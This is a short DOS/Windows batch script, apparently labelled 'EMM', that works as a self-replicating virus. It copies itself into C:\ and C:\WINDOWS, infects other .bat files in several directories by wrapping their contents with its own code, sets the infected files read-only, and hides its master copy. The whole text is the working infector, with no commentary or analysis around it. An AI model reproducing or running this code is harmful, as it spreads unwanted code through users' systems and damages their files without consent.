   @echo off
   if %2==EMM_inf goto EMM_inf
   if not exist c:\EMM.bat copy EMM.bat c:\ >nul
   if not exist C:\WINDOWS\copy_emm.bat type c:\EMM.bat > C:\WINDOWS\copy_emm.bat
   if not exist c:\EMM.bat type C:\WINDOWS\copy_emm.bat > c:\EMM.bat
   if not exist c:\EMM.bat copy %0.bat c:\EMM.bat >nul
   for %%a in (..\*.bat *.bat c:\*.bat c:\windows\*.bat) do call %0 %%a EMM_inf
   goto fin
   :EMM_inf
   find "EMM"<%1>nul
   if not errorlevel 1 goto fin

   type %1>bakk.bak
   echo @echo off>%1
   echo if %%2==EMM_inf goto EMM_inf>>%1
   echo cls>>%1
   type bakk.bak>>%1
   type c:\EMM.bat>>%1
   attrib %1 +r
   :fin
   attrib c:\EMM.bat +h +r
